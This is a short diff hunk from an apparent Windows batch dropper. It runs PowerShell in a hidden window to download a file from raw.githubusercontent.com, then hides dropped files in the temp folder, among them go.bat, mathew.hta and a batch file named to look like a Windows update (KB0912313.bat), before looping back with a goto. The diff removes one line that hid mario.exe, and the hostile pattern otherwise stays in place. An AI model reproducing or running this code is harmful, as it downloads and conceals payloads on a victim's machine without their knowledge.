@@ -4,7 +4,7 @@ powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.c
 cmd /c attrib +h %tmp%/go.bat 
 cmd /c attrib +h %tmp%/mathew.hta
 cmd /c attrib +h %tmp%/KB0912313.bat 
-cmd /c attrib +h %tmp%/mario.exe 
+ 
 
 goto top1 
 
